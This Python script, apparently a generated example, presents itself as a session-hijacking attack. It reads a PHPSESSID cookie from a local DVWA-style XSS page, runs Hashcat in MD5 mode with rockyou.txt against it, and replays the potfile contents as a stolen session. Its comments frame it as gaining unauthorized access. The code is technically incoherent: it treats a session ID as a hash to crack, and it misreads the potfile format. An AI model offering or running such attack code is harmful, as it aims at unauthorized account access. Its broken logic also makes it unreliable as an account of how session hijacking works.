# Brute-Force Attacks, Hashcat and Description
# This Python class aims to execute a brute-force session hijacking attack using the Hashcat tool.
# Hashcat is a highly efficient password cracking tool utilized to conduct brute-force attacks
# to hijack sessions. The focus of this example is on targeting the specified URL (http://127.0.0.1/vulnerabilities/xss_d/)
# Each method demonstrates how to exploit vulnerabilities in order to gain unauthorized access. 

import requests
import subprocess
import re

class SessionHijack:
    
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def start_brute_force(self, hashfile, wordlist):
        """Use Hashcat to brute-force stolen session hash."""
        print("Starting brute-force...")
        command = ["hashcat", "-a", "0", "-m", "0", hashfile, wordlist]
        subprocess.run(command)
    
    def get_hash(self, response):
        """Extracts session hash from response headers or content"""
        cookies = response.headers.get('Set-Cookie')
        session_hash = re.search(r'PHPSESSID=([a-fA-F0-9]+)', cookies)
        if session_hash:
            return session_hash.group(1)
        return None
    
    def hijack_session(self, session_id):
        """Hijack the session using brute-forced session ID"""
        print(f"Hijacking session with ID: {session_id}")
        cookies = {'PHPSESSID': session_id}
        response = self.session.get(self.target_url, cookies=cookies)
        if "Welcome, authorized user" in response.text:
            print("Session hijacked successfully!")
            print(response.text)
        else:
            print("Failed to hijack the session.")
    
def main():
    target_url = "http://127.0.0.1/vulnerabilities/xss_d/"
    hijacker = SessionHijack(target_url)
    
    # Mimic a traffic request to grab initial session hash
    response = hijacker.session.get(target_url)
    session_hash = hijacker.get_hash(response)
    if session_hash:
        print(f"Session hash found: {session_hash}")
        
        # Example hashfile and wordlist paths, assuming they're already generated
        hashfile = "session.hash"
        wordlist = "rockyou.txt"
        
        # Let's simulate saving correct session hash to hashfile for demo purposes
        with open(hashfile, 'w') as f:
            f.write(session_hash + "\n")
        
        # Bruteforce the hash
        hijacker.start_brute_force(hashfile, wordlist)
        
        # Assuming Hashcat saved cracked hashes in hashcat.potfile
        with open("hashcat.potfile", 'r') as f:
            cracked_hash = f.read().strip()
            hijacker.hijack_session(cracked_hash)
    else:
        print("No session hash found.")

if __name__ == "__main__":
    main()
